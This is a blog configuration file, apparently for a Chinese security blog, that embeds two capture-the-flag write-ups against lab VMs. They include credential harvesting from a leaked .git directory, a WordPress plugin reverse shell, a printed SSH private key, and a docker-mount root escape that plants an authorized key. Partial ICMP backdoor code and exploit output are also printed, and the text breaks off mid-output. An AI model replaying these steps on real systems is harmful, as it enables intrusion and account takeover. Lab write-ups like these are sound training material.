{"singlePage": [], "startSite": "", "filingNum": "", "onePageListNum": 15, "commentLabelColor": "#006b75", "yearColorList": ["#bc4c00", "#0969da", "#1f883d", "#A333D0"], "i18n": "CN", "themeMode": "manual", "dayTheme": "light", "nightTheme": "dark", "urlMode": "pinyin", "script": "", "style": "", "head": "", "indexScript": "", "indexStyle": "", "bottomText": "", "showPostSource": 1, "iconList": {}, "UTC": 8, "rssSplit": "sentence", "exlink": {}, "needComment": 1, "allHead": "", "title": "MJ", "subTitle": "\u5ac9\u5992\u80fd\u8ba9\u4f60\u524d\u8fdb\uff0c\u4f46\u4e5f\u80fd\u8ba9\u4f60\u9677\u5165\u6df1\u6e0a\u3002", "avatarUrl": "https://avatars.githubusercontent.com/u/99706997?v=4", "GMEEK_VERSION": "last", "pageSize": 8, "defaultTheme": "light", "themeColor": "#8A2BE2", "nav": [{"title": "\u9996\u9875", "url": "/"}, {"title": "WP", "url": "/tag.html#WP"}, {"title": "\u5173\u4e8e", "url": "https://faabbi.github.io/post/about.html"}, {"title": "GitHub", "url": "https://github.com/faabbi"}], "comment": {"type": "utterances", "utterances": {"repo": "faabbi/faabbi.github.io", "issue-term": "pathname"}}, "postListJson": {"P2": {"htmlDir": "docs/post/link-MJ.html", "labels": ["WP"], "postTitle": "link-MJ", "postUrl": "post/link-MJ.html", "postSourceUrl": "https://github.com/faabbi/faabbi.github.io/issues/2", "commentNum": 0, "wordCount": 11990, "description": "## 1.\u4fe1\u606f\u6536\u96c6\n```\n\u250c\u2500\u2500(root\u327fkali)-[/tmp/test]\n\u2514\u2500# nmap -sn 192.168.2.0/24               \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-10-31 09:29 EDT\nNmap scan report for 192.168.2.1\nHost is up (0.0035s latency).\nMAC Address: B4:5F:84:E2:C0:16 (zte)\nNmap scan report for 192.168.2.3\nHost is up (0.035s latency).\nMAC Address: 6A:80:FA:9D:CC:1F (Unknown)\nNmap scan report for 192.168.2.6\nHost is up (0.000065s latency).\nMAC Address: C8:8A:9A:D9:80:32 (Intel Corporate)\nNmap scan report for 192.168.56.164 (192.168.2.15)\nHost is up (0.00013s latency).\nMAC Address: 08:00:27:C0:73:27 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report for 192.168.2.14\nHost is up.\nNmap done: 256 IP addresses (5 hosts up) scanned in 15.14 seconds\n```\n\u5f00\u653e22\u548c80\u7aef\u53e3\n```\n\u250c\u2500\u2500(root\u327fkali)-[/tmp/test]\n\u2514\u2500# nmap --min-rate 10000 -p- 192.168.2.15\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-10-31 09:30 EDT\nNmap scan report for 192.168.56.164 (192.168.2.15)\nHost is up (0.00055s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\nMAC Address: 08:00:27:C0:73:27 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap done: 1 IP address (1 host up) scanned in 5.43 seconds\n```\n\u57fa\u672c\u670d\u52a1\u63a2\u6d4b\uff0c\u53d1\u73b0.git\u76ee\u5f55\uff0c\u53ef\u80fd\u5b58\u5728git\u6cc4\u9732\n```\n\u250c\u2500\u2500(root\u327fkali)-[/tmp/test]\n\u2514\u2500# nmap -sV -sC -O -p22,80 192.168.2.15  \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-10-31 09:31 EDT\nNmap scan report for 192.168.56.164 (192.168.2.15)\nHost is up (0.00093s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)\n| ssh-hostkey: \n|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)\n|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)\n|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)\n80/tcp open  http    Apache httpd 2.4.62 ((Debian))\n|_http-title: RedBean&#039;s Blog\n|_http-server-header: Apache/2.4.62 (Debian)\n|_http-generator: WordPress 6.7\n| http-git: \n|   192.168.2.15:80/.git/\n|     Git repository found!\n|     .git/config matched patterns 'user'\n|     Repository description: Unnamed repository; edit this file 'description' to name the...\n|_    Last commit message: wordpress \nMAC Address: 08:00:27:C0:73:27 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 10.74 seconds\n```\n\ngithack\u62c9\u5230\u672c\u5730\uff0c\u5728wordpress.sql\u6587\u4ef6\u548cwp-config\u6587\u4ef6\u4e2d\u53d1\u73b0wordpress\u5bc6\u7801hash\n\u4e0e\u6570\u636e\u5e93\u51ed\u636e\uff0c\u7834\u89e3hash\u83b7\u53d6\u660e\u6587\u5bc6\u7801\n\nWordpress:      Yliken/ichliebedich\nMysql:          root/root\n\n```\nINSERT INTO `wp_users` VALUES (1,'Yliken','$P$B.58QLT1rmg1yTSJN7Qzzkoi9WnXF9.','yliken','Yliken@RedBean.com','http://192.168.56.164','2025-10-28 16:08:56','',0,'Yliken');\n\n/** Database username */\ndefine( 'DB_USER', 'root' );\n/** Database password */\ndefine( 'DB_PASSWORD', 'root' );\n```\n\n## 2.web\u6e17\u900f\n\n<img width='2554' height='1064' alt='Image' src='https://github.com/user-attachments/assets/1dd81a2e-60dd-4da1-8ad2-3d9735f7aa31' />\n\n\n\u767b\u5f55\u5230\u540e\u53f0\uff0c\u4fee\u6539\u63d2\u4ef6\u83b7\u53d6\u53cd\u5f39shell\uff0c\u7981\u7528\u63d2\u4ef6\u4fee\u6539\uff0c\u7136\u540e\u518d\u542f\u7528\uff0c\u4e0d\u7136\u4f1a\u6709\u62a5\u9519\n\n<img width='2559' height='1164' alt='Image' src='https://github.com/user-attachments/assets/2374e149-2847-4493-afcf-58029a3b1078' />\n\n\n## 3.\u63d0\u6743\n\n\u63d0\u5347\u5230\u5b8c\u6574\u4ea4\u4e92\u6027shell\nrlwrap nc -lvvp 2332  (\u8fd9\u6837\u5305\u88f9nc\uff0c\u53ef\u80fd\u4f1a\u5728vim\u65f6\u51fa\u73b0\u4e71\u7801\uff0c\u4e0d\u54e6\u90a3\u4e2arlwrap\u7ecf\u8fc7\u4ee5\u4e0b\u5904\u7406\u4e00\u6837\u80fd\u591f\u7ffb\u547d\u4ee4)\n```\n\u250c\u2500\u2500(root\u327fkali)-[~]\n\u2514\u2500# nc -lvvp 2332\nlistening on [any] 2332 ...\n192.168.2.14: inverse host lookup failed: Unknown host\nconnect to [192.168.2.14] from (UNKNOWN) [192.168.2.14] 41966\nbash: cannot set terminal process group (414): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@link:/var/www/html/wp-content/plugins/akismet$ /usr/bin/script -qc /bin/bash\n<tent/plugins/akismet$ /usr/bin/script -qc /bin/bash    \nwww-data@link:/var/www/html/wp-content/plugins/akismet$ ^Z\nzsh: suspended  nc -lvvp 2332\n                                                                                                         \n\u250c\u2500\u2500(root\u327fkali)-[~]\n\u2514\u2500# stty raw -echo;fg\n[1]  + continued  nc -lvvp 2332\n                               reset\nreset: unknown terminal type unknown\nTerminal type? xterm           #\u8be2\u95ee\u7ec8\u7aef\u7c7b\u578b\u5728\u672c\u5730\u7ec8\u7aefecho $TERM\u67e5\u770b\nwww-data@link:/var/www/html/wp-content/plugins/akismet$ export SHELL=/bin/bash\nwww-data@link:/var/www/html/wp-content/plugins/akismet$ export\nTERM=xterm-256color\nwww-data@link:/var/www/html/wp-content/plugins/akismet$ stty rows 19 columns 87;                    #\u5c3a\u5bf8\u5927\u5c0f\u5728\u672c\u5730\u7ec8\u7aefstty -a\u67e5\u770b\n\n```\n### Yliken\n\n\u67e5\u770b\u7aef\u53e3\u53d1\u73b0\u6709\u53ea\u5bf9\u672c\u5730\u5f00\u653e\u76848080\u7aef\u53e3\n```\nState      Recv-Q     Send-Q         Local Address:Port          Peer Address:Port     \nLISTEN     0          128                  0.0.0.0:22                 0.0.0.0:*        \nLISTEN     0          80                 127.0.0.1:3306               0.0.0.0:* \n\nLISTEN     0          128                127.0.0.1:8080               0.0.0.0:*        \nLISTEN     0          128                     [::]:22                    [::]:*        \nLISTEN     0          128                        *:80                       *:*\n```\n\nsocket\u8f6c\u53d1\u51fa\u53bb\n```\nwww-data@link:/$ socket TCP-LISTEN:9999,fork TCP:127.0.0.1:8080 &\n```\n\n\u8bbf\u95ee\u53d1\u73b0\u662ffileBrower\n\n<img width='2092' height='366' alt='Image' src='https://github.com/user-attachments/assets/4a0497cc-3a30-48c4-8e9e-ba4f79693323' />\n\n\n\u67e5\u770b\u8fdb\u7a0b\u53d1\u73b0\u662fyliken\u6743\u9650\u542f\u52a8\n```\nwww-data@link:/app/yliken$ ps -aux | grep yliken\nyliken       321  0.0  0.3 1231760 7876 ?        Ssl  07:43   0:00 /home/yliken/fileBrower\nwww-data    1839  0.0  0.0   3176   636 pts/7    S+   10:04   0:00 grep yliken\n```\n\n\u901a\u8fc7ln\u94fe\u63a5\u7136\u540eweb\u8bbf\u95ee\u83b7\u53d6yliken\u7528\u6237\u5bb6\u76ee\u5f55\u654f\u611f\u6587\u4ef6\n```\nwww-data@link:/app/yliken$ ln -s /home/yliken/ ./temp\n```\n\u5f97\u5230\u79c1\u94a5\n```\n-----BEGIN OPENSSH PRIVATE KEY-----\n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\n-----END OPENSSH PRIVATE KEY-----\n```\nuser.txt\n```\n\u250c\u2500\u2500(root\u327fkali)-[~]\n\u2514\u2500# ssh -i /root/id_rsa yliken@192.168.2.15             \nLinux link 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Fri Oct 31 10:08:19 2025 from 192.168.2.14\n$ bash\nyliken@link:~$ cat user.txt\nflag{2b6d0f77e398476ede85fe65586bf33c}\n\n```\n\n### root\nssh\u8fde\u4e0a\u9776\u673a\u53d1\u73b0yliken\u7528\u6237\u5728docker\u7ec4\uff0c\u53ef\u4ee5\u8003\u8651docker\u9003\u9038\u63d0\u6743\n\n```\nyliken@link:~$ id\nuid=1000(yliken) gid=1000(yliken) groups=1000(yliken),998(docker)\n```\n\u5229\u7528docker\u6302\u8f7d\u4e3b\u673a\u6839\u76ee\u5f55\n```\nyliken@link:~$ docker images\nREPOSITORY    TAG       IMAGE ID       CREATED        SIZE\nhello-world   latest    1b44b5a3e06a   2 months ago   10.1kB\nubuntu        18.04     f9a80a55f492   2 years ago    63.2MB\nyliken@link:~$ docker run -v /:/tmp -it ubuntu:18.04 bash\nroot@48c9bad9b420:/# chroot /tmp\n# bash\nroot@48c9bad9b420:/# \n```\n\u540e\u9762\u63d0\u6743\u65b9\u5f0f\u5f88\u591a\uff0c\u5199\u5165ssh\u516c\u94a5\uff0c\u521b\u5efa\u65b0root\u7528\u6237\uff0c\u4fee\u6539passwd\u6587\u4ef6\uff0c\u7ed9bash\u8bbe\u7f6es\u4f4d\uff0c\u4fee\u6539root\u5bc6\u7801\u7b49\uff0c\u8fd9\u91cc\u65b9\u6cd5\u5199\u5165ssh\u516c\u94a5\n\n\n```\nroot@48c9bad9b420:~/.ssh# echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQClUpaEKHlyG1yCMmNTl3nbj+ZzfgpxcvmHWEAV0CMmFZ+mJ/1m5hRfeJ/waaLTE+Ov+woDZaRHfXPESP3W+3QsQj+AMeVFLQ+eQv0W+PhCIWBI18jtJhImEvC6xWM5XNY9tG/4moICziMJ6b81hYevmvEGVI8RKR5IK6ikXHmPXvRZxJmaRltDIFXDQgdgLHHEjXbQ0DAeSRjCeSk+9gKHIX+KQ8qcDX+Y1z15A/PgMzQ0QvxP7Yoezfqr4ZwYI3ohpuOaeGXq/9D5Sh1LU7l7uG7BnZWaTRfptcbWFIohEzVXcW2+C+h8LuSgWxQPT+t6tZ7kfKYk6Cm4XgTXLZLMxOdoG40x4JNk11xkMEr4RYZoIArlPP3y3nL1hvB6lgcVzyH0Yrd2QBUzJmZ2ar9IdRJZf0ZclmJ/VOy527Bm6bksiKDzhBZOgD1xYL/2MkiYDS01li3FHIh1ku17tnXWi64RDE2eGOvQFeL8XC53YZ9rlsVSJ7SOs05mDT1DPpwTMYP2S9Aw+HTNlwJayaRkXd28PS22YSiUyxkbYu83aHCibCfQhpfIz9FrVVJjg2Rri/vETOBNARuLzZci7UkNe4LExUUdTw6UsaAF9G9+Ku/qIq7CRuFuqURsT7j/MYVv1/5ylobcYfk+2wqW0isiawr7qrF5q0NRq/+abarB6Q== root@192.168.2.15' >> authorized_keys\nroot@48c9bad9b420:~/.ssh# ls\nauthorized_keys\n```\n\nroot.txt\n```\n\u250c\u2500\u2500(root\u327fkali)-[~]\n\u2514\u2500# ssh -i /tmp/id_rsa root@192.168.2.15                \nLinux link 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Wed Oct 29 01:17:44 2025 from 192.168.56.1\nroot@link:~# cat root.txt\nflag{e6a6e8eac98579c8d826d07df3c132bc}\n```\n\u3002", "top": 0, "createdAt": 1762766855, "style": "", "script": "", "head": "", "ogImage": "https://avatars.githubusercontent.com/u/99706997?v=4", "createdDate": "2025-11-10", "dateLabelColor": "#0969da"}, "P3": {"htmlDir": "docs/post/BabyShell-MJ.html", "labels": ["WP"], "postTitle": "BabyShell-MJ", "postUrl": "post/BabyShell-MJ.html", "postSourceUrl": "https://github.com/faabbi/faabbi.github.io/issues/3", "commentNum": 0, "wordCount": 12785, "description": "## 1.\u4fe1\u606f\u6536\u96c6\n```\n\u250c\u2500\u2500(root\u327fkali)-[/tmp/test]\n\u2514\u2500# nmap --min-rate 10000 -p- 192.168.2.9\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-11-09 02:03 EST\nNmap scan report for 192.168.2.9\nHost is up (0.00038s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:FE:B7:5D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 9.91 seconds\n```\n\u53ea\u5f00\u653e\u4e8622\u548c80\u7aef\u53e3\n\u5bf980\u7aef\u53e3\u8fdb\u884c\u8fdb\u4e00\u6b65\u63a2\u6d4b\n\n```\n\u250c\u2500\u2500(root\u327fkali)-[/tmp/test]\n\u2514\u2500# nmap -sV -sC -p80 192.168.2.9       \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-11-09 02:05 EST\nNmap scan report for 192.168.2.9\nHost is up (0.00023s latency).\n\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.62 ((Debian))\n|_http-title: Site doesn't have a title (text/html).\n|_http-server-header: Apache/2.4.62 (Debian)\nMAC Address: 08:00:27:FE:B7:5D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 12.95 seconds\n                                                                                                         \n\u250c\u2500\u2500(root\u327fkali)-[/tmp/test]\n\u2514\u2500# nmap --script=vuln -p80 192.168.2.9 \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-11-09 02:05 EST\nNmap scan report for 192.168.2.9\nHost is up (0.00028s latency).\n\nPORT   STATE SERVICE\n80/tcp open  http\n|_http-dombased-xss: Couldn't find any DOM based XSS.\n|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.\n|_http-csrf: Couldn't find any CSRF vulnerabilities.\n| http-enum: \n|_  /backup.zip: Possible backup\nMAC Address: 08:00:27:FE:B7:5D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 37.38 seconds\n\n```\n\u53d1\u73b0\u5907\u4efd\u6587\u4ef6\uff0c\u6709\u4e9b\u5185\u5bb9\u88ab\u5220\u4e86\uff0c\u4e0d\u8fc7\u5927\u4f53\u53ef\u4ee5\u547d\u4ee4\u6267\u884c\n```\n\u250c\u2500\u2500(root\u327fkali)-[/tmp/test]\n\u2514\u2500# cat icmp.py \n#!/usr/bin/env python3\nimport os\nimport sys\nimport socket\nimport struct\nimport time\nimport subprocess\nimport signal\nimport threading\nfrom scapy.all import ICMP, IP, Raw, send, sniff, Ether\nimport base64\n\nTRIGGER_SEQUENCE = b'Mazesec'\nLISTEN_INTERFACE = 'enp0s3'\nSERVER_IP = '0.0.0.0'\n\nclass ICMPServer:\n    def __init__(self):\n        self.running = True\n        self.client_ips = {}\n    \n    def signal_handler(self, sig, frame):\n        print('\\n[!] Stopping server...')\n        self.running = False\n        sys.exit(0)\n    \n    def execute_command_as_user(self, command, uid=1000, timeout=30):\n    \n    def parse_icmp_command(self, packet_data):\n        try:\n            trigger_len = len(TRIGGER_SEQUENCE)\n            if len(packet_data) < trigger_len + 4:\n                return None\n            \n            if packet_data[:trigger_len] != TRIGGER_SEQUENCE:\n                return None\n            \n            cmd_len = struct.unpack('>I', packet_data[trigger_len:trigger_len+4])[0]\n            \n            if cmd_len <= 0 or cmd_len > 4096:\n                return None\n            \n            if len(packet_data) < trigger_len + 4 + cmd_len:\n                return None\n                \n            command = packet_data[trigger_len+4:trigger_len+4+cmd_len].decode('utf-8', errors='ignore')\n            return command\n            \n        except Exception as e:\n            print(f'[-] Parse error: {e}')\n            return None\n    \n    def create_icmp_response(self, original_packet, result):\n        try:\n            result_bytes = result.encode('utf-8') if isinstance(result, str) else result\n            result_len = len(result_bytes)\n            trigger_len = len(TRIGGER_SEQUENCE)\n            \n            payload = TRIGGER_SEQUENCE\n            payload += struct.pack('>I', result_len)\n            payload += result_bytes\n            \n            response = IP(dst=original_packet[IP].src) / \\\n                      ICMP(type=0, id=original_packet[ICMP].id, seq=original_packet[ICMP].seq) / \\\n                      Raw(load=payload)\n            \n            return response\n            \n        except Exception as e:\n            print(f'[-] Response creation error: {e}')\n            return None\n    \n    def handle_icmp_packet(self, packet):\n        if not self.running:\n            return\n        \n        try:\n            if packet.haslayer(ICMP) and packet[ICMP].type == 8:\n                src_ip = packet[IP].src\n                \n                if packet.haslayer(Raw):\n                    icmp_data = bytes(packet[Raw].load)\n                    \n                    command = self.parse_icmp_command(icmp_data)\n                    \n                    if command:\n                        print(f'[+] Command from {src_ip}: {command}')\n                        \n                        # \u4ee5UID 1000\u6267\u884c\u547d\u4ee4\n                        result = self.execute_command_as_user(command, 1000)\n                        print(f'[+] Result length: {len(result)}')\n                        \n                        # \u4ee5root\u6743\u9650\u53d1\u9001ICMP\u54cd\u5e94\n                        response = self.create_icmp_response(packet, result)\n                        if response:\n                            send(response, verbose=0)\n                            print(f'[+] Response sent to {src_ip}')\n                        \n                        self.client_ips[src_ip] = time.time()\n                    \n        except Exception as e:\n            print(f'[-] Packet handling error: {e}')\n    \n    def start_server(self):\n        \n        signal.signal(signal.SIGINT, self.signal_handler)\n        signal.signal(signal.SIGTERM, self.signal_handler)\n        \ndef main():\n    server = ICMPServer()\n    server.start_server()\n\nif __name__ == '__main__':\n    main()\n```\n## 2.zero\nexp\u62ff\u5230\u53cd\u5f39shell\uff0c\u4ea4\u4e92\u5f88\u6709\u9650\u5f39\u4e2a\u6b63\u5e38shell\u52302332\u7aef\u53e3\n```\n\u250c\u2500\u2500(root\u327fkali)-[/tmp/test]\n\u2514\u2500# python3 ez.py 192.168.2.9 \n[*] Testing connection to 192.168.2.9...\n[\u2192] Sending: whoami\n[\u2190] Response received (5 bytes)\n[+] Backdoor active! Current user: zero\n\n[*] Gathering system information...\n[\u2192] Sending: id\n[\u2190] Response received (48 bytes)\n\n=== id ===\nuid=1000(zero) gid=1000(zero) groups=1000(zero)\n\n[\u2192] Sending: uname -a\n[\u2190] Response received (87 bytes)\n\n=== uname -a ===\nLinux BabyShell 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64 GNU/Linux\n\n[\u2192] Sending: pwd\n[\u2190] Response received (2 bytes)\n\n=== pwd ===\n/\n\n[\u2192] Sending: ls -la\n[\u2190] Response received (6 bytes)\n\n=== ls -la ===\nls -la\n[\u2192] Sending: cat /etc/passwd | head -20\n[\u2190] Response received (1016 bytes)\n\n=== cat /etc/passwd | head -20 ===\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\n\n[\u2192] Sending: ip addr show\n[\u2190] Response received (817 bytes)\n\n=== ip addr show ===\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host \n       valid_lft forever preferred_lft forever\n2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000\n    link/ether 08:00:27:fe:b7:5d brd ff:ff:ff:ff:ff:ff\n    inet 192.168.2.9/24 brd 192.168.2.255 scope global 